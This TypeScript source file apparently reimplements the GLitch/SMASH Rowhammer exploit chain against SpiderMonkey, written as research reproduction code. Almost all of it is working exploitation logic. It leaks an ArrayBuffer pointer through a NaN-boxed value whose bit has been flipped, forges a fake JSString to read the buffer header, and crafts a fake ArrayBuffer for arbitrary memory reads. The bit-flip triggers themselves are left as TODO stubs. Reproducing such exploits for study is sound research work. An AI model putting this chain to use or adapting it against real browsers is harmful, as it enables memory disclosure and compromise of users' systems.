/* This code reimplements the end-to-end exploit from the GLitch paper.
 *
 * (GLitch) Grand Pwning Unit: Accelerating Microarchitectural Attacks with the GPU
 *  - Paper: https://ieeexplore.ieee.org/document/8418604
 *  - Video: https://www.youtube.com/watch?v=0WmbNDApQWE
 *  - Code: see email from Pietro
 *
 * SMASH: Synchronized Many-Sided Rowhammer Attacks From JavaScript
 *  - Paper: https://www.usenix.org/system/files/sec21-de-ridder.pdf
 */

/*** The lower 47b of an NaN-boxed pointer are the pointer's target address. */
const JSVAL_TAG_SHIFT = 47;

/** The size of the ArrayBuffer's header: 0x40 = 64B. */
const ARRAYBUFFER_HEADER_SZ_BYTES = 0x40;

// GLitch uses JSVAL_TAG_CLEAR = 0xFFFFFF80 and JSVAL_TYPE_STRING = 0x06 to
// construct TAG as (JSVAL_TAG_CLEAR | JSVAL_TYPE_STRING) in 32-bit SpiderMonkey.
// See https://searchfox.org/mozilla-central/source/js/public/Value.h#207.
const JSVAL_TAG_DOUBLE = 0x1fff0; // 17b
const JSVAL_TYPE_STRING = 0x06;
const JSVAL_TYPE_OBJ = 0x0c;

const JSVAL_STRING_TAG = JSVAL_TAG_DOUBLE | JSVAL_TYPE_STRING;
const JSVAL_OBJ_TAG = JSVAL_TAG_DOUBLE | JSVAL_TYPE_OBJ;

const indent = "    ";

/**
 * Converts a number to a 64-bit floating point representation (IEEE754) and
 * returns it as a binary string.
 * Credits to Max Koretskyi (https://stackoverflow.com/a/37092416/3017719).
 * 
 * @param number - The number to convert.
 * @returns The 64-bit floating point representation as a string.
 */
function numberToFloat64Bin(number: number): string {
  if (typeof number !== "number") {
    return "";
  }

  var f = new Float64Array(1);
  f[0] = number;
  var view = new Uint8Array(f.buffer);
  var i: number,
    result = "";
  for (i = view.length - 1; i >= 0; i--) {
    var bits = view[i].toString(2);
    if (bits.length < 8) {
      bits = new Array(8 - bits.length).fill("0").join("") + bits;
    }
    result += bits;
  }
  return result;
}

/**
 * Extracts a range of bits from a binary string and returns the decimal value.
 *
 * @param value - The binary string from which to extract the bits.
 * @param startIdx - The starting index of the range (inclusive).
 * @param endIdx - The ending index of the range (exclusive).
 * @returns The decimal value of the extracted bits.
 */
function extractBits(
  value: string,
  startIdx: number,
  endIdx: number,
  padBits = 0
) {
  return parseInt(
    value
      .split("")
      .reverse()
      .slice(startIdx, endIdx)
      .reverse()
      .join("")
      .padStart(padBits, "0"),
    2
  );
}

/**
 * Converts a binary string representation of a 64-bit IEEE 754 floating-point number to a JavaScript number.
 *
 * @param bin - The binary string representation of the number.
 * @returns The converted floating-point number.
 */
function float64BinToNumber(bin: string): number {
  const buffer = new ArrayBuffer(8);
  const view = new DataView(buffer);
  // This is needed as we need to write the bytes in reverse order.
  let targetBlockStart = 64;
  // Convert the binary string to an array of bits.
  const bits = bin.split("");
  for (let i = 0; i < 64; i += 8) {
    // Take a byte from the input and make a single string out of it.
    const byte = bits.slice(i, i + 8).join("");
    // Write the byte to the buffer.
    view.setUint8(targetBlockStart / 8 - 1, parseInt(byte, 2));
    // Move to the next byte.
    targetBlockStart -= 8;
  }
  return view.getFloat64(0, true);
}

function hex(u32: number) {
  return "0x" + u32.toString(16).padStart(8, "0");
}

/**
 * Translates the unicode-encoded (leaked) header of the ArrayBuffer 
 */
function unicode_to_hex(u: string) : string[] {
  var res = [];
  for (let i = 0; i < u.length; i += 2) {
    var temp1 = u.charCodeAt(i + 1) << 16;
    var reso = (u.charCodeAt(i) | temp1) >>> 0;
    res.push(reso);
  }
  return res.map((a) => {
    return a.toString(16).padStart(2, "0");
  });
}

function hexToBytes(hex) {
  let bytes = new Array<number>();
  for (let c = 0; c < hex.length; c += 2)
      bytes.push(parseInt(hex.substring(c, c+2), 16));
  return bytes;
}

/**
 * Prints the leaked ArrayBuffer header. This header is then used to create a
 * fake nested ArrayBuffer.
 * 
 * @param header - The leaked ArrayBuffer header.
 * @param lengthBytes - The number of bytes to print (normally 64B)
 */
function printArrayBufferHeader(header: string, lengthBytes: number) {
  if (typeof header === "string") {
    for (let i = 0; i < lengthBytes; i++) {
      let out = `0x${(4 * i).toString(16).padStart(3, "0")}:  `;
      for (let j = 7; j >= 0; j--) {
        out += unicode_to_hex(header[i * 8 + j]);
        if (j % 2 == 0) {
          out += " ";
        }
      }
      console.log(out);
    }
  }
}

/**
 * Writes the fake JSString that points to the ArrayBu
 */
function writeFakeJSStringObject(
  startOfft: number,
  sizeBytes: number,
  dataPtr: string,
  view: DataView
) {
  let bytesWritten = 0;

  // The first word (64b) of a JSString store flags, index, (and on some platforms) the length.

  // uint32_t flags;
  view.setUint16(startOfft + 0, 0x0230, true); // observed with JSString in Array
  bytesWritten += 2;
  view.setUint16(startOfft + 2, 0x0000, true);
  bytesWritten += 2;
  
  // uint32_t length;
  view.setUint16(startOfft + 4, sizeBytes, true); // length in UTF-8 characters
  bytesWritten += 2;
  view.setUint16(startOfft + 6, 0x0000, true);
  bytesWritten += 2;
  
  // address of data the string should point to
  view.setUint16(startOfft + 8, extractBits(dataPtr, 0, 16), true);
  bytesWritten += 2;
  view.setUint16(startOfft + 10, extractBits(dataPtr, 16, 32), true);
  bytesWritten += 2;
  view.setUint16(
    startOfft + 12,
    extractBits(dataPtr, 32, JSVAL_TAG_SHIFT),
    true
  );
  bytesWritten += 2;
  view.setUint16(startOfft + 14, 0x0000, true);
  bytesWritten += 2;

  return bytesWritten;  
}

/**
 * Generates a string of a specified size using the given character.
 * 
 * @param sizeBytes - The size of the string in bytes.
 * @param char - The character to repeat in the generated string.
 * @returns The generated string.
 */
function genStringOfSize(sizeBytes: number, char: string) {
  // Assumes UTF-16 characters, i.e., 2 bytes per character.
  return char.repeat((sizeBytes * 8) / 16);
}

/**
 * Converts a number to a hexadecimal string representation of a 64-bit floating-point number.
 * 
 * @param nbr - The number to convert.
 * @returns The hexadecimal string representation of the 64-bit floating-point number.
 */
function numberToFloat64Hex(nbr: number): string {
  let bin = numberToFloat64Bin(nbr);
  if (bin === "") {
    return "";
  }
  return `0x${binStringToHex(bin)}`;
}

function genDoublePointer(
  ptr: number,
  tag: number,
  bitflipPos: number
): number {
  if (bitflipPos < 0 || bitflipPos > 16) {
    throw new Error(`Invalid bitflip position ${bitflipPos}!`);
  }

  if (ptr > Number.MAX_SAFE_INTEGER) {
    throw new Error(
      `Pointer 0x${ptr.toString(16)} exceeds the max safe integer (${
        Number.MAX_SAFE_INTEGER
      }) in JavaScript!`
    );
  }

  console.log(`ptr = ${ptr.toString(2)} (0x${ptr.toString(16)})`);

  let xorVal = 1 * Math.pow(2, bitflipPos); // the bit to be flipped later
  let tagf = ((tag >>> 0) ^ xorVal) >>> 0;
  // console.log(`tag         = ${tag.toString(2)} (0x${tag.toString(16)})`);
  // console.log(`tag flipped = ${tagf.toString(2)} (0x${tagf.toString(16)})`);

  let dbl =
    tagf.toString(2).padStart(17, "0") +
    ptr.toString(2).padStart(JSVAL_TAG_SHIFT, "0");
  console.log("dbl = " + dbl);
  let result = binaryStringToFloat(dbl);
  console.log("result = " + result);
  console.log("result = " + numberToFloat64Hex(result));

  return result;
}

/**
 * Converts a binary string to a hexadecimal string.
 * This is necessary to do hex character-wise because .toString(16) does not
 * work correctly with large binary numbers.
 *
 * @param n1 - The binary string to convert.
 * @returns The hexadecimal string.
 * @throws Error if the binary string length is not a multiple of 4.
 */
function binStringToHex(n1: string): string {
  let hex = "";
  let arr = n1.split("");

  if (arr.length % 4 !== 0) {
    throw new Error(
      "Binary string length must be a multiple of 4 for binStringToHex."
    );
  }

  let offt = 4; // to convert exactly four bits into one hex digit
  for (let i = 0; i < arr.length; i += offt) {
    hex += parseInt(arr.slice(i, i + offt).join(""), 2).toString(16);
  }

  return hex;
}

/**
 * Encodes a binary string into a IEEE754 floating-point number.
 * 
 * @param binaryStr - The binary string to convert.
 */
function binaryStringToFloat(binaryStr: string): number {
  if (binaryStr.length !== 64) {
    throw new Error(
      `Binary string must be 64 bits long but is ${binaryStr.length}b.`
    );
  }

  console.log(`binaryStr = ${binaryStr}`);

  // Extract sign bit (1 bit)
  let sign = binaryStr[0] === "1" ? -1 : 1;
  // console.log(`sign = ${sign}`);

  // Extract and convert exponent bits (11 bits)
  let exponentBits = binaryStr.split("").slice(1, 12).join("");
  // console.log(`exponentBits = ${exponentBits}`)
  let exponent = parseInt(exponentBits, 2) - 1023; // Exponent bias is 1023 for double precision

  // Extract fraction/mantissa bits (52 bits)
  let fractionBits = binaryStr.split("").slice(12, 64).join("");
  // console.log(`fractionBits = ${fractionBits}`);
  let fraction = 1; // The implicit leading bit (1 before the decimal point in normalized form)

  // Calculate the fraction value
  for (let i = 0; i < fractionBits.length; i++) {
    if (fractionBits[i] === "1") {
      fraction += Math.pow(2, -(i + 1));
    }
  }

  // Compute the final floating-point number
  return sign * Math.pow(2, exponent) * fraction;
}

function runEndToEndExploit(patterns, arr) {
  // We allocate and initialize a small (inlined) ArrayBuffer.
  // Array buffers with size of less than 96 bytes are inlined (header and data sequentially).
  var bufLeak8iSz = 80;
  var bufLeak8i = new ArrayBuffer(bufLeak8iSz);
  console.log("[>] Allocating ArrayBuffer 'bufLeak8i' of " + bufLeak8iSz + " bytes");

  console.log(
    `[>] Filling ArrayBuffer 'bufLeak8i' with 8-byte floats: 1.25, 9.25, ...`
  );
  // You can use `sudo busybox devmem <paddr>` to read the physical memory and 
  // then verify the output with https://baseconvert.com/ieee-754-floating-point.
  let view = new DataView(bufLeak8i);
  for (let i = 0; i < bufLeak8i.byteLength; i += 8) {
    // view.setFloat64(i, i + 1.25, true);
    view.setUint32(i, 0, true);
    view.setUint32(i + 4, 0, true);
  }
  
  // We create an Array with a vulnerable array cell.
  let elemsz_bits = 64;
  // Update helper.sh when changing the array's size as it relies on 3 MiB to detect the array.
  let arrSz = 3 * mb;
  console.log("[>] Allocating array 'arr' of size " + arrSz / mb + " MiB");
  var arr = new Array(arrSz / (elemsz_bits / 8));
  console.log(`[>] Filling array 'arr' with 1, 2, ...`);
  for (let j = 0; j < arr.length; j += 1) {
    arr[j] = j + 1;
  }
  
  // We store the pointer to bufLeak8i in a vulnerable Array cell.
  // We must use bufLeak8i and not bufLeak8i[0] because the latter would just copy the value!
  console.log(`[>] Storing pointer to 'bufLeak8i' in 'arr[0]'`);
  arr[0] = bufLeak8i;
  
  console.log(
    `[!] Trigger bit flip now in 'arr[0]' to convert it into a readable double!`
  );
  
  // Print the content of arr[].
  for (let j = 0; j < 4; j++) {
    console.log(`${indent}arr[${j}]: ${arr[j]} ${numberToFloat64Hex(arr[j])}`);
  }

  // We trigger a 1-to-0 bit flip on this pointer to derandomize the object's location
  // as if tag (higher 32 bits) is lower than 0xffffff80, it is interpreted as a pointer
  
  do {
    // TODO: trigger first bit flip (1->0 in arr[0]) here to leak ArrayBuffer's pointer

  } while (typeof arr[0] !== "number");

  // Bit flipped (1->0) in arr[0] => it is now a readable double!
  // Extract pointer from double (i.e., the lower 48 bits).
  // This pointer points to the leaked ArrayBuffer (bufLeak8i).
  let arr0float64to48bsub = numberToFloat64Bin(arr[0])
    .split("")
    .slice(-JSVAL_TAG_SHIFT)
    .join("");

  if (arr0float64to48bsub.length !== JSVAL_TAG_SHIFT) {
    throw new Error(`arr0float64to48bsub has invalid length (${arr0float64to48bsub.length})`);
  }

  let ptr2bufLeak8i = parseInt(arr0float64to48bsub, 2);
  console.log(`${indent}*bufLeak8i: 0x${ptr2bufLeak8i.toString(16)}`);

  let fakeJSStringSz = writeFakeJSStringObject(0, ARRAYBUFFER_HEADER_SZ_BYTES, arr0float64to48bsub, view);
  console.log(`[>] Writing fake JSString (${fakeJSStringSz}B) to 'bufLeak8i[0]' with ptr to bufLeak8i hdr`);

  console.log("[>] Writing double to 'bufLeak8i[0]' in arr[1]");
  // We add 0x40 here (64 bytes) as the first element of bufLeak8i is at offset 64 due to the ArrayBuffer's header.
  // GLITCH uses 0x30 (48 bytes) instead.
  arr[1] = genDoublePointer(ptr2bufLeak8i + ARRAYBUFFER_HEADER_SZ_BYTES, JSVAL_STRING_TAG, 13);

  // Print content of bufLeak8i[0] and bufLeak8i[1].
  for (let j = 0; j < 2; j++) {
    let bits128 = "";
    for (let i = j * 4; i < j * 4 + 4; i++) {
      bits128 += view
        .getUint16(i * 2, true)
        .toString(16)
        .padStart(4, "0");
    }
    console.log(`${indent}bufLeak8i[${j}]: 0x${bits128}`);
  }

  do {
    // TODO: trigger second bit flip (0->1 in arr[1]) here
    // 0->1 bit flip to generate pointer to fake JSString to leak ArrayBuffer's header.

  } while (typeof arr[1] !== "string");

  // Bit flipped (0->1) in arr[1] => it is now pointing to the fake JSString
  
  console.log("[>] arr[1] is a JSString, printing the ArrayBuffer's header:");
  printArrayBufferHeader(arr[1], 8);
  
  // Convert the leaked ArrayBuffer header (unicode-encoded) into bytes.
  let fakeString: string = arr[1];
  const fakeStringSz = fakeString.length*16/8;  // 16b per UTF-16 char
  console.log(`[>] Converting fake JSString to ArrayBuffer header bytes (sz: ${fakeStringSz}B)`);
  let headerBytes = new Uint8Array(ARRAYBUFFER_HEADER_SZ_BYTES);
  for (let i = 0; i < 8; i++) {
    for (let j = 7; j >= 0; j--) {
      // conversion from one UTF-16 char (encoded as 16b) to one hex char (a-f)
      let hex = unicode_to_hex(fakeString[i * 8 + j]).join("");
      console.log(`${indent}fakeString[${i * 8 + j}] = 0x${hex} = ${hexToBytes(hex)[0]}`);
      // conversion such that every two hex chars (8b) are one byte
      headerBytes[i * 8 + j] = hexToBytes(hex)[0];   
    }
  }

  // Change data ptr of fake ArrayBuffer.
  // This can in theory point to anywhere to read out data.
  const DATA_PTR_OFF_8 = 0x40 / 2;
  let dataPtrOld = headerBytes[DATA_PTR_OFF_8];
  let dataPtrNew = dataPtrOld + ARRAYBUFFER_HEADER_SZ_BYTES + fakeJSStringSz;
  console.log(`[>] Changing data ptr of fake ArrayBuffer from ${dataPtrOld} to ${dataPtrNew}`);
  headerBytes[DATA_PTR_OFF_8] = dataPtrNew;
  
  // Write pointer to fake ArrayBuffer in arr[1]
  console.log(`[>] Writing pointer to fake ArrayBuffer in 'arr[1]'`);
  let obj_ptr = ptr2bufLeak8i + ARRAYBUFFER_HEADER_SZ_BYTES + fakeJSStringSz;
  arr[1] = genDoublePointer(obj_ptr, JSVAL_OBJ_TAG, 13);

  // Write fake ArrayBuffer header to memory.
  console.log(`[>] Allocated fake ArrayBuffer 'fakeArrayBuffer' @ 0x${obj_ptr.toString(16)}`);
  for (let i = 0; i < headerBytes.length; i++) {
    view.setUint8(fakeJSStringSz + i, headerBytes[i]);
  }
  
  do {
    // TODO: trigger third bit flip here:
    // 0->1 bit flip to craft pointer to fake ArrayBuffer.

  } while (!(arr[1] instanceof ArrayBuffer));

  // Read fake ArrayBuffer via newly crafted pointer.
  let fakeBufView = new DataView(arr[1]);
  console.log(`[>] Reading fake ArrayBuffer via 'arr[1]'`);
  for (let i = 0; i < 64; i += 8) {
    console.log(`${indent}fakeArrayBuffer[${i}]: 0x${fakeBufView.getUint32(i, true).toString(16).padStart(8, "0")}`);
  }
}
